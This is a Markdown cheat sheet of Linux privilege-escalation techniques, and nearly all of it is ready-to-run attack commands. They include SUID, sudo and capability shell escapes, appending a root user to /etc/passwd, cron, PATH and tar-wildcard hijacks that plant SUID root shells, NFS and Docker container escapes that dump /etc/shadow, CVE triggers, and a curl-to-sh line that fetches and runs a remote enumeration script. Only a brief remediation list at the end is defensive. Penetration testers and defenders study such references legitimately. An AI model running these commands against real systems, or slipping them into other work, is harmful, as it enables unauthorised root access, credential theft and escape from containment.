# Linux Privilege Escalation

Linux privilege escalation techniques exploit misconfigurations, vulnerable software, or insecure permissions to elevate access from a low-privileged user to root on a Linux system.

## Initial Enumeration

```bash
# Current user and groups
id
whoami
groups

# System information
uname -a
cat /etc/os-release
cat /proc/version

# Other users
cat /etc/passwd | grep -v nologin | grep -v false
cat /etc/shadow  # if readable
lastlog

# Network information
ip addr
ss -tlnp
netstat -tlnp
cat /etc/hosts
arp -a

# Running processes
ps aux
ps -ef

# Installed packages
dpkg -l  # Debian/Ubuntu
rpm -qa  # RHEL/CentOS

# Automated enumeration
# Upload and run: LinPEAS, LinEnum, linux-exploit-suggester
curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh
```

## SUID/SGID Binaries

```bash
# Find SUID binaries
find / -perm -4000 -type f 2>/dev/null

# Find SGID binaries
find / -perm -2000 -type f 2>/dev/null

# Find both
find / -perm -u=s -o -perm -g=s -type f 2>/dev/null
```

Exploitable SUID binaries (check GTFOBins):

```bash
# Example: SUID on find
find . -exec /bin/sh -p \;

# Example: SUID on python
python -c 'import os; os.execl("/bin/sh", "sh", "-p")'

# Example: SUID on cp
cp /etc/passwd /tmp/passwd.bak
echo 'root2:$(openssl passwd -1 password):0:0:root:/root:/bin/bash' >> /tmp/passwd.bak
cp /tmp/passwd.bak /etc/passwd

# Example: SUID on vim
vim -c ':!/bin/sh'

# Example: SUID on nmap (older versions)
nmap --interactive
!sh

# Example: SUID on env
env /bin/sh -p

# Example: SUID on bash
bash -p
```

## Sudo Misconfigurations

```bash
# Check sudo permissions
sudo -l

# Common exploitable sudo entries:
# (ALL) NOPASSWD: /usr/bin/vim
sudo vim -c ':!/bin/bash'

# (ALL) NOPASSWD: /usr/bin/find
sudo find / -exec /bin/bash \;

# (ALL) NOPASSWD: /usr/bin/awk
sudo awk 'BEGIN {system("/bin/bash")}'

# (ALL) NOPASSWD: /usr/bin/less
sudo less /etc/hosts
!/bin/bash

# (ALL) NOPASSWD: /usr/bin/python3
sudo python3 -c 'import pty;pty.spawn("/bin/bash")'

# (ALL) NOPASSWD: /usr/bin/perl
sudo perl -e 'exec "/bin/bash";'

# (ALL) NOPASSWD: /usr/bin/ruby
sudo ruby -e 'exec "/bin/bash"'

# (ALL) NOPASSWD: /usr/bin/env
sudo env /bin/bash

# (ALL) NOPASSWD: /usr/bin/zip
sudo zip /tmp/test.zip /tmp/test -T --unzip-command="sh -c /bin/bash"

# sudo version exploit (CVE-2021-3156 Baron Samedit)
sudoedit -s '\' $(python3 -c 'print("A"*1000)')

# sudo rule bypass (CVE-2019-14287)
# If sudo rule says: (ALL, !root) NOPASSWD: /bin/bash
sudo -u#-1 /bin/bash
```

## Cron Job Exploitation

```bash
# Enumerate cron jobs
crontab -l
ls -la /etc/cron*
cat /etc/crontab
ls -la /var/spool/cron/crontabs/

# Find writable scripts called by cron
cat /etc/crontab | grep -v '#'
# Check permissions on each script
ls -la /path/to/cron/script

# Overwrite writable cron script
echo '#!/bin/bash' > /path/to/writable/script.sh
echo 'cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash' >> /path/to/writable/script.sh

# After cron executes:
/tmp/rootbash -p

# Wildcard injection (if cron uses tar with *)
# In the directory where tar * runs:
echo "" > "--checkpoint=1"
echo "" > "--checkpoint-action=exec=sh shell.sh"
echo '#!/bin/bash' > shell.sh
echo 'cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash' >> shell.sh

# PATH hijacking in cron (if script uses relative commands)
# If cron script calls "backup" instead of "/usr/bin/backup"
echo '#!/bin/bash' > /tmp/backup
echo 'cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash' >> /tmp/backup
chmod +x /tmp/backup
# Wait for cron to run with /tmp in PATH
```

## Kernel Exploits

```bash
# Check kernel version
uname -r

# Notable kernel exploits:
# DirtyPipe (CVE-2022-0847) — Linux 5.8+
# DirtyCow (CVE-2016-5195) — Linux 2.x-4.x
# PwnKit (CVE-2021-4034) — pkexec polkit
# Baron Samedit (CVE-2021-3156) — sudo
# Looney Tunables (CVE-2023-4911) — glibc

# Use linux-exploit-suggester
./linux-exploit-suggester.sh
```

## Capabilities Abuse

```bash
# Find binaries with capabilities
getcap -r / 2>/dev/null

# cap_setuid on python3
/usr/bin/python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'

# cap_setuid on perl
/usr/bin/perl -e 'use POSIX qw(setuid); setuid(0); exec "/bin/bash";'

# cap_dac_read_search on tar (read any file)
tar czf /tmp/shadow.tar.gz /etc/shadow
tar xzf /tmp/shadow.tar.gz -C /tmp/

# cap_net_raw (packet sniffing)
# Can capture credentials from network traffic
```

## PATH Hijacking

```bash
# If a SUID binary or root script calls a command without full path:
# 1. Identify the relative command call
strings /usr/local/bin/suid-binary | grep -v '/'

# 2. Create malicious binary
echo '#!/bin/bash' > /tmp/service
echo 'cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash' >> /tmp/service
chmod +x /tmp/service

# 3. Prepend PATH
export PATH=/tmp:$PATH

# 4. Execute the SUID binary
/usr/local/bin/suid-binary

# 5. Use the root shell
/tmp/rootbash -p
```

## NFS no_root_squash

```bash
# Check NFS exports from target
showmount -e TARGET_IP
cat /etc/exports  # if local access

# If no_root_squash is set:
# On attacker machine (as root):
mkdir /tmp/nfs
mount -t nfs TARGET_IP:/shared /tmp/nfs
cp /bin/bash /tmp/nfs/rootbash
chmod +s /tmp/nfs/rootbash

# On target:
/shared/rootbash -p
```

## Docker Escape

```bash
# Check if inside Docker
ls /.dockerenv
cat /proc/1/cgroup | grep docker

# If user is in docker group:
docker run -v /:/mnt --rm -it alpine chroot /mnt sh

# Mounted Docker socket
docker -H unix:///var/run/docker.sock run -v /:/mnt -it alpine chroot /mnt sh

# Privileged container escape
mkdir /tmp/escape && mount -t cgroup -o rdma cgroup /tmp/escape
echo 1 > /tmp/escape/notify_on_release
host_path=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)
echo "$host_path/cmd" > /tmp/escape/release_agent
echo '#!/bin/sh' > /cmd
echo 'cat /etc/shadow > /output' >> /cmd
chmod +x /cmd
sh -c "echo \$\$ > /tmp/escape/cgroup.procs"
```

## Writable Files and Directories

```bash
# World-writable directories
find / -writable -type d 2>/dev/null

# Writable /etc/passwd (add root user)
echo 'hacker:$(openssl passwd -1 password):0:0::/root:/bin/bash' >> /etc/passwd
su hacker

# Writable /etc/shadow (replace root hash)
# Generate hash: openssl passwd -6 -salt xyz password

# Writable systemd service files
find /etc/systemd/ -writable -type f 2>/dev/null

# SSH keys
find / -name "id_rsa" -o -name "authorized_keys" -writable 2>/dev/null
```

## GTFOBins Quick Reference

Check https://gtfobins.github.io/ for any binary found with SUID, sudo, or capabilities. Key categories: shell escape, file read, file write, SUID exploitation, sudo exploitation, capability exploitation.

## Remediation Checks

- Remove unnecessary SUID/SGID bits from binaries
- Audit and restrict sudo rules using the principle of least privilege
- Ensure cron scripts use absolute paths and are not world-writable
- Keep kernel and system packages up to date
- Remove unnecessary Linux capabilities from binaries
- Use `root_squash` on all NFS exports
- Restrict Docker group membership and socket access
